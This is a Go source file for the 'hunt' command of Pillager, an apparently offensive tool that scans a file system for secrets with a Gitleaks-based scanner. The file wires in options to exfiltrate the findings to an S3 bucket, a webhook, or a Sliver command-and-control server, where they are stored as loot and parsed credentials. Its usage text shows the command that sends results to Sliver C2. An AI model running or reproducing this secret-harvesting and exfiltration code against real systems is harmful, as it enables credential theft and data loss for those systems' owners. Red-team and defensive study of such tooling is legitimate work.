// Package commands contains the command line logic.
//
// The commands package is the primary consumer of all packages in the /pkg directory.
package commands

import (
	"context"
	"fmt"
	"os"
	"runtime"
	"strings"

	"github.com/brittonhayes/pillager"
	"github.com/brittonhayes/pillager/pkg/exfil"
	_ "github.com/brittonhayes/pillager/pkg/exfil/s3"      // Register S3 exfiltrator
	_ "github.com/brittonhayes/pillager/pkg/exfil/sliver"  // Register Sliver exfiltrator
	_ "github.com/brittonhayes/pillager/pkg/exfil/webhook" // Register webhook exfiltrator
	"github.com/brittonhayes/pillager/pkg/scanner"
	"github.com/brittonhayes/pillager/pkg/tui/model"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

var (
	dedupe      bool
	entropy     float64
	format      string
	redact      bool
	templ       string
	interactive bool
	workers     int

	// Exfiltration flags
	exfilType     string
	exfilCompress bool
	exfilEncrypt  string
	s3Bucket      string
	s3Region      string
	s3Endpoint    string
	s3Prefix      string
	s3AccessKey   string
	s3SecretKey   string
	webhookURL    string
	webhookHeader []string

	// Sliver C2 flags
	sliverConfig     string
	sliverLootName   string
	sliverLootType   string
	sliverParseCreds bool
)

// huntCmd represents the hunt command.
var huntCmd = &cobra.Command{
	Use:   "hunt [directory]",
	Short: "Hunt for loot",
	Long:  "Hunt inside the file system for valuable information",
	Example: `
	Basic:
		pillager hunt .
		
	Wordlist Format:
		pillager hunt . -f wordlist > results.txt

	CSV Format:
		pillager hunt . -f csv > results.csv
	
	HTML Format:
		pillager hunt . -f html > results.html

	Custom Go Template Format:
		pillager hunt . --template "{{ range .}}Secret: {{.Secret}}{{end}}"

	Exfiltrate to Sliver C2:
		pillager hunt . --exfil sliver --sliver-config ~/.sliver-client/configs/operator.cfg
`,
	RunE: func(cmd *cobra.Command, args []string) error {
		opts, err := setupConfig()
		if err != nil {
			return err
		}

		// Get path from args if provided
		if len(args) > 0 {
			opts.Path = args[0]
		}

		// Check if path is provided either via args or config
		if opts.Path == "" {
			return fmt.Errorf("scan path must be provided either as an argument or in the config file")
		}

		s, err := scanner.NewGitleaksScanner(*opts)
		if err != nil {
			return fmt.Errorf("failed to create scanner: %w", err)
		}

		if interactive {
			return runInteractive(s)
		}

		results, err := s.Scan()
		if err != nil {
			return err
		}

		if len(results) == 0 {
			fmt.Println("[]")
			log.Debug().Msg("no secrets or sensitive information were found at the target directory")
			return nil
		}

		// Exfiltrate findings if exfil type is specified
		if exfilType != "" {
			if err := exfiltrateFindings(results); err != nil {
				return fmt.Errorf("exfiltration failed: %w", err)
			}
			fmt.Printf("[+] Successfully exfiltrated %d findings to %s\n", len(results), exfilType)
		}

		return s.Reporter().Report(os.Stdout, results)
	},
}

func runInteractive(h scanner.Scanner) error {
	m := model.NewModel(h)
	p := tea.NewProgram(m, tea.WithAltScreen())
	return p.Start()
}

func exfiltrateFindings(findings []pillager.Finding) error {
	// Build exfil config
	cfg := exfil.Config{
		Type:          exfilType,
		EncryptionKey: exfilEncrypt,
		Compress:      exfilCompress,
	}

	// Add type-specific options
	switch exfilType {
	case "s3":
		cfg.S3 = &exfil.S3Options{
			Bucket:    s3Bucket,
			Region:    &s3Region,
			Endpoint:  &s3Endpoint,
			Prefix:    &s3Prefix,
			AccessKey: &s3AccessKey,
			SecretKey: &s3SecretKey,
		}

	case "webhook":
		headers := make(map[string]string)
		for _, header := range webhookHeader {
			parts := splitHeader(header)
			if len(parts) == 2 {
				headers[parts[0]] = parts[1]
			}
		}

		cfg.Webhook = &exfil.WebhookOptions{
			URL:     webhookURL,
			Headers: headers,
		}

	case "sliver":
		cfg.Sliver = &exfil.SliverOptions{
			ConfigPath:       sliverConfig,
			LootName:         &sliverLootName,
			LootType:         &sliverLootType,
			ParseCredentials: &sliverParseCreds,
		}

	default:
		return fmt.Errorf("unsupported exfil type: %s", exfilType)
	}

	// Create exfiltrator
	exfiltrator, err := exfil.Create(cfg)
	if err != nil {
		return fmt.Errorf("failed to create exfiltrator: %w", err)
	}
	defer exfiltrator.Close()

	// Exfiltrate findings
	ctx := context.Background()
	return exfiltrator.Exfiltrate(ctx, findings)
}

func splitHeader(header string) []string {
	for i, c := range header {
		if c == ':' {
			return []string{strings.TrimSpace(header[:i]), strings.TrimSpace(header[i+1:])}
		}
	}
	return []string{header}
}

func init() {
	rootCmd.AddCommand(huntCmd)

	huntCmd.Flags().StringVarP(&format, "format", "f", "json", "set secret reporter format")
	huntCmd.Flags().BoolVar(&redact, "redact", false, "redact secret from results")
	huntCmd.Flags().StringVarP(&templ, "template", "t", "", "set go text/template string for output format")
	huntCmd.Flags().BoolVarP(&interactive, "interactive", "i", false, "run in interactive mode")
	huntCmd.Flags().BoolVarP(&dedupe, "dedupe", "d", false, "deduplicate results")
	huntCmd.Flags().Float64VarP(&entropy, "entropy", "e", 3.0, "minimum entropy value for results")
	huntCmd.Flags().IntVarP(&workers, "workers", "w", runtime.NumCPU(), "number of concurrent workers")

	// Exfiltration flags
	huntCmd.Flags().StringVar(&exfilType, "exfil", "", "exfiltration type (s3, webhook, sliver)")
	huntCmd.Flags().BoolVar(&exfilCompress, "exfil-compress", false, "compress findings before exfiltration")
	huntCmd.Flags().StringVar(&exfilEncrypt, "exfil-encrypt", "", "encryption key (env:VAR, file:/path, or base64)")

	// S3 flags
	huntCmd.Flags().StringVar(&s3Bucket, "s3-bucket", "", "S3 bucket name")
	huntCmd.Flags().StringVar(&s3Region, "s3-region", "us-east-1", "S3 region")
	huntCmd.Flags().StringVar(&s3Endpoint, "s3-endpoint", "", "S3 endpoint URL (for MinIO, etc.)")
	huntCmd.Flags().StringVar(&s3Prefix, "s3-prefix", "findings", "S3 object key prefix")
	huntCmd.Flags().StringVar(&s3AccessKey, "s3-access-key", "", "S3 access key (or use AWS_ACCESS_KEY_ID env var)")
	huntCmd.Flags().StringVar(&s3SecretKey, "s3-secret-key", "", "S3 secret key (or use AWS_SECRET_ACCESS_KEY env var)")

	// Webhook flags
	huntCmd.Flags().StringVar(&webhookURL, "webhook-url", "", "webhook URL for HTTP POST")
	huntCmd.Flags().StringSliceVar(&webhookHeader, "webhook-header", []string{}, "webhook headers (format: 'Key:Value')")

	// Sliver C2 flags
	huntCmd.Flags().StringVar(&sliverConfig, "sliver-config", "", "path to Sliver operator config file (e.g., ~/.sliver-client/configs/operator.cfg)")
	huntCmd.Flags().StringVar(&sliverLootName, "sliver-loot-name", "pillager-scan", "prefix for loot item names in Sliver")
	huntCmd.Flags().StringVar(&sliverLootType, "sliver-loot-type", "file", "loot type for findings file (file, credential/credentials)")
	huntCmd.Flags().BoolVar(&sliverParseCreds, "sliver-parse-creds", true, "parse and store credentials in Sliver's credential store")

	// Bind flags to viper
	viper.BindPFlag("dedupe", huntCmd.Flags().Lookup("dedupe"))
	viper.BindPFlag("entropy", huntCmd.Flags().Lookup("entropy"))
	viper.BindPFlag("format", huntCmd.Flags().Lookup("format"))
	viper.BindPFlag("redact", huntCmd.Flags().Lookup("redact"))
	viper.BindPFlag("template", huntCmd.Flags().Lookup("template"))
	viper.BindPFlag("workers", huntCmd.Flags().Lookup("workers"))
}
